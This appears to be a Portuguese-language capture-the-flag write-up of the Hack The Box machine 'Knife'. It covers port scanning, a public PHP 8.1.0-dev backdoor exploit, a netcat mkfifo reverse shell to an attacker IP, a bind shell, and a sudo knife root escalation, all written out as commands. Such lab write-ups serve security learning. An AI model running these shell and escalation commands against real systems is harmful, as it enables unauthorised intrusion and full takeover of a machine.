Knife
========================

## Enumeration
  Enumerar as portas e serviços que o servidor está rodando:

    sudo nmap -Pn -A -sS -T4 10.10.10.242
    PORT   STATE SERVICE VERSION
        22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey: 
        |   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
        |   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
        |_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
        80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
        |_http-server-header: Apache/2.4.41 (Ubuntu)
        |_http-title:  Emergent Medical Idea
        
        
Ao identificar as versões de cada serviço rodando na máquina, fomos procurar por m exploit

    searchsploit 2.4.41
    
   Nada relevante encontrado. 
   
   Verificar o que tem na porta web aí (porta 80):
   
   PHP/8.1.0-dev
   
   ![qownnotes-media-BUTYeL](../../../media/qownnotes-media-BUTYeL.png)

Mais uma versão encontrada. Procurar novamente no searchsploit:

    searchsploit 8.1.0-dev

   ![qownnotes-media-kGNWGA](../../../media/qownnotes-media-kGNWGA.png)

## Exploitation

Encontrado um exploit. Rodando o exploit:

    searchsploit -p php/webapps/49933.py
    (Verificar o funcionamento do exploit primeiramente)
    python3 /usr/share/exploitdb/exploits/php/webapps/49933.py
    Enter the full host url:
    http://knife.htb
    $
  
  Objetivo aqui é conseguir uma shell melhor ao invés da webshell. Reconhecendo o alvo:
  
  Referência:
  Linux
  https://gtfobins.github.io/ 
  Windows
  https://lolbas-project.github.io/#
  
      ls /usr/bin
 A ideia aqui foi enumerar todos os binários presentes no servidor,  no intutio de encontrar algum que possa nos ajudar a enontrar a conseguir a shell reversa. 
 
 **Detalhe aqui que o awk não funcionou e ainda não descobri o porquê**
             (reverso)
             
       rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.74 80 >/tmp/f
 
   (bind)
   
      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 2222 >/tmp/f    
      
      
Com o comando acima foi possível obter a shell reversa com o netcat tradicional.

Próximo passo é conseguir a shell full terminal

    python3 -c 'import pty; pty.spawn("/bin/bash")'
    export TERM=xterm
    
## Privilege Escalation

Prmeiro obter informações a respeito do sistem operacional;

    (cat /proc/version || uname -a ) 2>/dev/null
    
    Linux version 5.4.0-80-generic (buildd@lcy01-amd64-030) (gcc version 9.3.0 (Ubuntu 9.3.0-17ubuntu1~20.04)) #90-Ubuntu SMP Fri Jul 9 22:49:44 UTC 2021
    
    lsb_release -a 2>/dev/null
    Distributor ID: Ubuntu
    Description:    Ubuntu 20.04.2 LTS
    Release:        20.04
    Codename:       focal

    
Feito isso, procurar por exploits de kernel:

    searchsploit "ubuntu 20.04"
    searchsploit Ubuntu
    searchsploit 9.3.0
    
Nada encontrado. O que de fato resolveu o problema foi ter ideintficado um binário que pode ser executado em modo root sem senha por meio do comando sudo. Para isto, executei o seguinte;

    sudo -l
    
![qownnotes-media-DnSWny](../../../media/qownnotes-media-DnSWny.png)

Uma vez identificado o binário "knife", fui buscar referências dele para entender como eu poderia executar um comando no ssistema por meio deste cara. Foi assim que descobri o knife exec -E

    sudo knife exec -E 'system("/bin/bash")'
    
 ![qownnotes-media-UuHOTG](../../../media/qownnotes-media-UuHOTG.png)





